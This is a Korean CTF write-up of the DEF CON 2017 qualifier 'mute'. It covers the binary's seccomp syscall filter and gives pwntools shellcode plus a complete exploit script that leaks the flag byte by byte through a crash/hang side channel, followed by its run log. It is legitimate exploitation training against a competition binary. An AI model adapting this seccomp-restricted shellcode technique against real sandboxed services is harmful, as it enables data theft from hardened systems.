---
title: "Potent Pwnables) mute"
sidebar_position: 1
---
## **Information**

### **Description**
```
Hush, you.

mute\_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443

Files <https://2017.notmalware.ru/1945c04a342d1d860859c2f35083a276f57f1d31/mute>
```
### **File**

* [mute](/attachments/1147556/1147555.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2017/tree/master/mute>

## **Writeup**

### File information

```bash title="File information"  
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$ file mute
mute: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c37c5241fad4af47c79288b1f0aea4b63418e86, not stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$ checksec.sh --file mute
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   mute
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$
```

### **Binary analysis**

#### **Main**

* 해당 함수는 다음과 같은 기능을 합니다.
  + mmap()함수를 이용해 size는 4096이고, Read,Write,Exec 가 가능한 메모리 영역을 생성합니다.
  + dropSyscalls() 함수를 호출합니다.
  + read() 함수를 이용해 mmap()함수가 생성한 메모리 영역에 값을 입력받습니다.
  + 그리고 buf 영역으로 Call 합니다.
  + 즉, buf영역에 ShellCode를 작성해서 flag를 얻을수 있습니다.

```c title="main"
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsi@1
  FILE *v4; // rdi@1
  int len; // [rsp+14h] [rbp-Ch]@1
  void *buf; // [rsp+18h] [rbp-8h]@1

  len = 0;
  v3 = (void *)4096;
  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);//mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) 
  puts("SILENCE, FOUL DAEMON!");
  v4 = _bss_start;
  fflush(_bss_start);
  dropSyscalls();
  while ( len != 0x1000 )
  {
    v3 = buf;
    v4 = 0LL;
    len += read(0, buf, 0x1000 - len);
  }
  ((void (__fastcall *)(FILE *, void *))buf)(v4, v3);
  return 0;
}
```

#### **dropSyscalls()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + seccomp\_init(), seccomp\_arch\_add(), seccomp\_load() 함수들이 호출됩니다.
    - seccomp\_init() : seccomp 필터 상태 초기화
    - seccomp\_arch\_add() : seccomp 필터 아키텍처 관리
    - seccomp\_load() : seccomp 필터를 커널에 로드
  + 해당 함수들은 프로세스가 사용할 수 있는 System Call을 제한하기 위해 커널에서 제공되는 함수들입니다.
  + 즉, 이러한 기능으로 인해 Shellcode를 작성할 때 제약이 발생합니다.

```c title="dropSyscalls"
__int64 dropSyscalls()
{
  ctx = seccomp_init(0LL);
  if ( !ctx )
  {
    seccomp_reset(ctx, 0LL);
    _exit(-1);
  }
  seccomp_arch_add(ctx, 0xC000003ELL);          // SCMP_ARCH_X86_64
  addRule(0);
  addRule(2u);
  addRule(3u);
  addRule(4u);
  addRule(5u);
  addRule(6u);
  addRule(7u);
  addRule(8u);
  addRule(9u);
  addRule(0xAu);
  addRule(0xBu);
  addRule(0xCu);
  addRule(0x3Bu);
  return seccomp_load(ctx);
}
```

#### **addRule()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + seccomp\_rule\_add() 함수를 이용해 seccomp 필터 규칙을 추가합니다.

```c title="addRule"
__int64 __fastcall addRule(unsigned int syscall)
{
  __int64 rc; // rax@1

  rc = seccomp_rule_add(ctx, 0x7FFF0000LL, syscall, 0LL);// SCMP_ACT_ALLOW
  if ( (_DWORD)rc )
    _exit(-syscall);
  return rc;
}
```

* 사용가능한 System call은 다음과 같습니다.

| rax | System call | rax | System call |
| --- | --- | --- | --- |
| 0 | sys\_read | 8 | sys\_lseek |
| 2 | sys\_open | 9 | sys\_mmap |
| 3 | sys\_close | 0xA | sys\_mprotect |
| 4 | sys\_stat | 0xB | sys\_munmap |
| 5 | sys\_fstat | 0xC | sys\_brk |
| 6 | sys\_lstat | 0x3b | sys\_execve |
| 7 | sys\_poll |  |  |

### Structure of Exploit code
:::note
* rbp, rsp 레지스터에 저장된 값을 백업
  + rbp에 저장된 값을 이용해 "len" 변수 영역에 접근 가능
  + rsp에 저장된 값을 이용해 "flag" 파일의 내용을 저장할 공간의 주소를 계산
  + 해당 값들을 r14, r15 레지스터에 저장
    - r14 레지스터에 0x838 빼서 해당 영역에 파일 내용을 저장(sub r14, 0x838)
* open(), read() 함수를 이용해 "flag" 파일의 내용을 메모리에 저장합니다.
  + open('./flag')
  + read('rax','r14',100)
* "cmp","je","jmp" 명령어를 이용해 메모리에 저장된 문자열을 확인합니다.
  + cmp [r14+''' + hex(locate) + '''], sil
    - je fin : 비교 대상 값이 같다면 해당 프로그램을 종료합니다.
    - jmp again : 비교 대상 값이 다르다면 다음 같이 동작합니다.
      * "len" 에 0을 저장
      * "read(0, buf, 0x1000 - len)" 코드 영역으로 이동
:::

* The following information is required for an attack:

:::note
* shellcode
:::

### **Information for attack**

#### **Shellcode**

* 다음과 같은 방법으로 Shellcode를 생성할 수 있습니다.
  + rsp, rbp 레지스터를 r14, r15에 저장하는 이유는 shellcode가 동작되는 동안 rsp, rbp 에 저장된 값이 변경될 수 있기 때문입니다.
  + rsp 영역에 파일 내용을 저장하면 main함수에서 사용한 변수 영역에 Overwitre 되기 때문에 r14 - 0x838영역에 저장합니다.

```python title="Shellcode"
from pwn import *

...

	shellcode = shellcode = asm('''
	cmp     r15, 0x0
	ja      load
	mov     r15, rbp
	mov 	r14,rsp
	sub 	r14, 0x838

	load:
	''')

	shellcode += asm(shellcraft.amd64.linux.open('./flag'))
	shellcode += asm(shellcraft.amd64.linux.read('rax','r14',count=flagLen))
	shellcode += asm('''
		xor     rsi, rsi
		mov     sil, ''' + hex(ch) + '''
		cmp     [r14+''' + hex(location) + '''], sil
		je fin
		jmp again

		again:
		mov [rbp-0xc],ebx
		mov r12, 0x400B0B
		jmp r12
	 
		fin:
		mov r12, 0x400B45
		jmp r12
	''')
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

context.arch = 'amd64'

flag = ''
flagLen = 120
prog = log.progress('Searching...')

for location in range(0,flagLen):
	p = process('./mute')
	p.recvline()

	for ch in range(32,127):
		shellcode = asm('''
			cmp     r15, 0x0
			ja      load
			mov     r15, rbp
			mov 	r14,rsp
			sub 	r14, 0x838

			load:
		''')
		shellcode += asm(shellcraft.amd64.linux.open('./flag'))
		shellcode += asm(shellcraft.amd64.linux.read('rax','r14',count=flagLen))
		shellcode += asm('''
			xor     rsi, rsi
			mov     sil, ''' + hex(ch) + '''
			cmp     [r14+''' + hex(location) + '''], sil
			je fin
			jmp again

			again:
			mov [rbp-0xc],ebx
			mov r12, 0x400B0B
			jmp r12
		 
			fin:
			mov r12, 0x400B45
			jmp r12
		''')
		
		try:
	       		p.send(shellcode.ljust(4096, "\x00"))
	   	except:		
			flag += chr(ch-0x1)
			log.info('Flag : ' + flag)
			p.close()
			break

prog.success('Done!')
log.info('Flag : ' + flag)
```

```sh title="Flag"
...

[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e6319
[+] Starting local process './mute': pid 127140
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 127140)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e63190
[+] Starting local process './mute': pid 127502
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 127502)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901
[+] Starting local process './mute': pid 127884
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 127884)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901f
[+] Starting local process './mute': pid 129326
[*] Process './mute' stopped with exit code -31 (SIGSYS) (pid 129326)
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901fa
[+] Starting local process './mute': pid 130668
[+] Starting local process './mute': pid 2081
[+] Starting local process './mute': pid 4014
[+] Starting local process './mute': pid 5917
[+] Starting local process './mute': pid 7819
[+] Starting local process './mute': pid 9721
[*] Flag : The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901fa
[*] Stopped process './mute' (pid 9721)
[*] Stopped process './mute' (pid 7819)
[*] Stopped process './mute' (pid 5917)
[*] Stopped process './mute' (pid 4014)
[*] Stopped process './mute' (pid 2081)
[*] Stopped process './mute' (pid 130668)
lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$
```

## **Flag**

|  |  |
| --- | --- |
| Flag | The flag is: I thought what I'd do was, I'd pretend I was one of those deaf mutes d9099cd0d3e6cb47fe3a9b0e631901fa |

## **Related Site**

* <https://bannsecurity.com/index.php/home/10-ctf-writeups/41-defcon-2017-mute>
* <http://man7.org/linux/man-pages/man3/seccomp_init.3.html>
* <http://man7.org/linux/man-pages/man3/seccomp_arch_add.3.html>
* <http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html>
* <http://man7.org/linux/man-pages/man3/seccomp_load.3.html>
* <http://man7.org/linux/man-pages/man2/seccomp.2.html>
* <https://ocw.cs.pub.ro/courses/cns/labs/lab-07>